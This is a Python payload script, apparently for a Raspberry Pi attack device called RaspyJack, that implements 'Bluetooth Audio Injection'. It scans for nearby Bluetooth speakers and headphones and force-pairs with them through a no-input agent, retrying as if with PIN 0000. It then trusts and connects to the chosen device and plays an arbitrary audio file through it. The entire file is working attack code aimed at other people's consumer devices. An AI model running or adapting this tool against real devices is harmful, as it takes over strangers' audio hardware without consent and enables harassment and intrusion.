#!/usr/bin/env python3
"""
RaspyJack Payload -- Bluetooth Audio Injection
===============================================
Author: 7h30th3r0n3

Scan for Bluetooth A2DP devices (speakers, headphones), attempt pairing,
and play audio through the target device.

Setup / Prerequisites
---------------------
- Bluetooth adapter (hci0)
- apt install bluez pulseaudio-module-bluetooth (or bluealsa)
- Audio file at /root/Raspyjack/config/bt_audio/payload.wav
  (or default system beep is used)

Controls
--------
  OK         -- Connect to selected device / play audio
  UP / DOWN  -- Select device
  KEY1       -- Scan for A2DP devices
  KEY2       -- Stop playback
  KEY3       -- Exit
"""

import os
import sys
import time
import re
import threading
import subprocess
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44
import LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button
from payloads._iface_helper import select_bt_interface

# ── Pin / LCD setup ──────────────────────────────────────────────────────────
PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = LCD.width, LCD.height
font = scaled_font()

# ── Constants ────────────────────────────────────────────────────────────────
HCI_DEV = None  # set in main() via select_bt_interface
AUDIO_FILE = "/root/Raspyjack/config/bt_audio/payload.wav"
ROWS_VISIBLE = 6
ROW_H = 12

# ── Shared state ─────────────────────────────────────────────────────────────
lock = threading.Lock()
devices = []          # [{addr, name, a2dp: bool}]
selected_idx = 0
scroll_pos = 0
connected_addr = ""
connection_status = ""
playback_status = ""
status_msg = "Idle"
play_proc = None
_running = True
_scan_active = False


# ── HCI helpers ──────────────────────────────────────────────────────────────

def _hci_up():
    subprocess.run(["sudo", "systemctl", "stop", "bluetooth"],
                   capture_output=True, timeout=5)
    subprocess.run(["sudo", "hciconfig", HCI_DEV, "down"],
                   capture_output=True, timeout=5)
    subprocess.run(["sudo", "hciconfig", HCI_DEV, "up"],
                   capture_output=True, timeout=5)
    time.sleep(0.3)


# ── Scan for BT Classic devices (bluetoothctl) ────────────────────────────────

def _scan_devices():
    """Scan for BT Classic devices using bluetoothctl."""
    global status_msg, _scan_active

    with lock:
        _scan_active = True
        status_msg = "Scanning..."

    _hci_up()
    found = []

    try:
        # Start bluetoothctl scan for classic devices
        proc = subprocess.Popen(
            ["sudo", "bluetoothctl"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )
        proc.communicate(
            input="power on\nscan on\n",
            timeout=12,
        )
    except (subprocess.TimeoutExpired, Exception):
        try:
            proc.kill()
        except Exception:
            pass

    time.sleep(0.5)

    # Collect discovered devices
    try:
        result = subprocess.run(
            ["bluetoothctl", "devices"],
            capture_output=True, text=True, timeout=5,
        )
        for line in result.stdout.splitlines():
            match = re.match(r"Device\s+([0-9A-Fa-f:]{17})\s+(.*)", line)
            if match:
                addr = match.group(1).upper()
                name = match.group(2).strip() or "(unknown)"
                found.append({"addr": addr, "name": name, "a2dp": False})
    except Exception as exc:
        with lock:
            status_msg = str(exc)[:20]

    # Stop scanning
    try:
        proc = subprocess.Popen(
            ["sudo", "bluetoothctl"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )
        proc.communicate(input="scan off\nquit\n", timeout=5)
    except Exception:
        try:
            proc.kill()
        except Exception:
            pass

    # Check each device for A2DP service
    for dev in found:
        with lock:
            if not _scan_active:
                break
        try:
            result = subprocess.run(
                ["sudo", "sdptool", "browse", dev["addr"]],
                capture_output=True, text=True, timeout=8,
            )
            if "Audio Sink" in result.stdout or "A2DP" in result.stdout:
                dev["a2dp"] = True
        except Exception:
            pass

    with lock:
        devices.clear()
        devices.extend(found)
        a2dp_count = sum(1 for d in found if d["a2dp"])
        status_msg = f"Found {len(found)} ({a2dp_count} A2DP)"
        _scan_active = False


# ── Pairing / connection ────────────────────────────────────────────────────

def _btctl_cmd(commands, timeout_sec=10):
    """Send commands to bluetoothctl and return output."""
    try:
        proc = subprocess.Popen(
            ["sudo", "bluetoothctl"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )
        input_str = "\n".join(commands) + "\nquit\n"
        stdout, _ = proc.communicate(input=input_str, timeout=timeout_sec)
        return stdout
    except subprocess.TimeoutExpired:
        try:
            proc.kill()
        except Exception:
            pass
        return ""
    except Exception:
        return ""


def _connect_device(addr):
    """Attempt to pair and connect to a BT audio device."""
    global connected_addr, connection_status, status_msg

    with lock:
        connection_status = "Pairing..."
        status_msg = f"Pairing {addr[-8:]}"

    # Power on, set agent, try pairing
    _btctl_cmd(["power on", "agent NoInputNoOutput", "default-agent"])
    time.sleep(0.5)

    output = _btctl_cmd([
        f"pair {addr}",
    ], timeout_sec=15)

    paired = "Pairing successful" in output or "already exists" in output.lower()

    if not paired:
        # Try with PIN 0000
        output = _btctl_cmd([
            f"pair {addr}",
        ], timeout_sec=10)

    with lock:
        connection_status = "Connecting..."
        status_msg = f"Connecting {addr[-8:]}"

    # Trust and connect
    _btctl_cmd([f"trust {addr}"], timeout_sec=5)
    time.sleep(0.5)
    output = _btctl_cmd([f"connect {addr}"], timeout_sec=15)

    if "Connection successful" in output or "Connected: yes" in output:
        with lock:
            connected_addr = addr
            connection_status = "Connected"
            status_msg = f"Connected {addr[-8:]}"
    else:
        with lock:
            connection_status = "Failed"
            status_msg = "Connection failed"


def _disconnect_device():
    """Disconnect from the current device."""
    global connected_addr, connection_status
    with lock:
        addr = connected_addr
    if addr:
        _btctl_cmd([f"disconnect {addr}"], timeout_sec=5)
    with lock:
        connected_addr = ""
        connection_status = "Disconnected"


# ── Audio playback ───────────────────────────────────────────────────────────

def _play_audio():
    """Play audio through the connected BT device."""
    global play_proc, playback_status, status_msg

    audio_path = AUDIO_FILE
    if not os.path.isfile(audio_path):
        # Generate a simple beep using sox if available
        try:
            subprocess.run(
                ["sox", "-n", audio_path, "synth", "5", "sine", "440"],
                capture_output=True, timeout=10,
            )
        except Exception:
            with lock:
                playback_status = "No audio file"
                status_msg = "No audio file"
            return

    with lock:
        playback_status = "Playing..."
        status_msg = "Playing audio"

    try:
        # Try paplay (PulseAudio) first, fall back to aplay
        for player in ["paplay", "aplay"]:
            try:
                proc = subprocess.Popen(
                    ["sudo", player, audio_path],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                )
                with lock:
                    play_proc = proc
                proc.wait(timeout=120)
                with lock:
                    playback_status = "Done"
                    status_msg = "Playback done"
                    play_proc = None
                return
            except FileNotFoundError:
                continue
            except subprocess.TimeoutExpired:
                proc.kill()
                break

        with lock:
            playback_status = "No player found"
            status_msg = "No audio player"

    except Exception as exc:
        with lock:
            playback_status = f"Error: {str(exc)[:14]}"
            status_msg = "Playback error"
            play_proc = None


def _stop_playback():
    """Stop current audio playback."""
    global playback_status
    with lock:
        p = play_proc
    if p:
        try:
            p.terminate()
            p.wait(timeout=3)
        except Exception:
            try:
                p.kill()
            except Exception:
                pass
    with lock:
        playback_status = "Stopped"


# ── Drawing ──────────────────────────────────────────────────────────────────

def _draw_screen():
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)

    with lock:
        msg = status_msg
        conn_status = connection_status
        play_status = playback_status
        conn_addr = connected_addr
        devs = list(devices)
        sp = scroll_pos
        sel = selected_idx
        scan_on = _scan_active

    # Header
    d.rectangle((0, 0, 127, 13), fill="#111")
    d.text((2, 1), "BT AUDIO INJECT", font=font, fill="#E91E63")
    if scan_on:
        d.ellipse((118, 3, 126, 11), fill="#FFAA00")
    elif conn_addr:
        d.ellipse((118, 3, 126, 11), fill="#00FF00")
    else:
        d.ellipse((118, 3, 126, 11), fill="#FF0000")

    y = 15
    d.text((2, y), msg[:22], font=font, fill="#888")
    y += 12

    # Connection / playback status
    if conn_addr:
        d.text((2, y), f"Conn: {conn_addr[-8:]}", font=font, fill="#00FF00")
        y += 12
    if play_status:
        d.text((2, y), f"Play: {play_status[:16]}", font=font, fill="#FFAA00")
        y += 12
    else:
        y += 12

    # Device list
    end = min(sp + ROWS_VISIBLE, len(devs))
    for i in range(sp, end):
        dev = devs[i]
        prefix = ">" if i == sel else " "
        name = dev["name"][:12]
        a2dp_tag = "*" if dev["a2dp"] else " "
        clr = "#FFAA00" if i == sel else "#CCCCCC"
        d.text((2, y), f"{prefix}{a2dp_tag}{name}", font=font, fill=clr)
        y += ROW_H

    if not devs:
        d.text((2, y), "K1 to scan", font=font, fill="#555")

    # Footer
    d.rectangle((0, 116, 127, 127), fill="#111")
    d.text((2, 117), "OK:Play K1:Scan K3:X", font=font, fill="#AAA")

    LCD.LCD_ShowImage(img, 0, 0)


# ── Main ─────────────────────────────────────────────────────────────────────

def main():
    global scroll_pos, selected_idx, status_msg, HCI_DEV

    HCI_DEV = select_bt_interface(LCD, font, PINS, GPIO)
    if not HCI_DEV:
        subprocess.run(["sudo", "systemctl", "start", "bluetooth"], capture_output=True, timeout=5)
        GPIO.cleanup()
        return 1

    os.makedirs(os.path.dirname(AUDIO_FILE), exist_ok=True)

    # Splash
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    d.text((8, 10), "BT AUDIO INJECT", font=font, fill="#E91E63")
    d.text((4, 28), "Inject audio into BT", font=font, fill="#888")
    d.text((4, 40), "speakers/headphones.", font=font, fill="#888")
    d.text((4, 60), "K1=Scan  OK=Connect", font=font, fill="#666")
    d.text((4, 72), "K2=Stop  K3=Exit", font=font, fill="#666")
    d.text((4, 88), "* = A2DP capable", font=font, fill="#FFAA00")
    LCD.LCD_ShowImage(img, 0, 0)
    time.sleep(1.0)

    try:
        while _running:
            btn = get_button(PINS, GPIO)

            if btn == "KEY3":
                break

            if btn == "KEY1":
                threading.Thread(target=_scan_devices, daemon=True).start()
                time.sleep(0.3)

            elif btn == "OK":
                with lock:
                    devs = list(devices)
                    sel = selected_idx
                if devs and 0 <= sel < len(devs):
                    addr = devs[sel]["addr"]
                    with lock:
                        conn = connected_addr
                    if conn != addr:
                        threading.Thread(
                            target=_connect_device, args=(addr,), daemon=True,
                        ).start()
                    else:
                        threading.Thread(target=_play_audio, daemon=True).start()
                time.sleep(0.3)

            elif btn == "UP":
                with lock:
                    selected_idx = max(0, selected_idx - 1)
                    if selected_idx < scroll_pos:
                        scroll_pos = selected_idx
                time.sleep(0.2)

            elif btn == "DOWN":
                with lock:
                    selected_idx = min(len(devices) - 1, selected_idx + 1)
                    if selected_idx >= scroll_pos + ROWS_VISIBLE:
                        scroll_pos = selected_idx - ROWS_VISIBLE + 1
                time.sleep(0.2)

            elif btn == "KEY2":
                _stop_playback()
                time.sleep(0.3)

            _draw_screen()
            time.sleep(0.05)

    finally:
        _stop_playback()
        _disconnect_device()
        try:
            LCD.LCD_Clear()
        except Exception:
            pass
        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
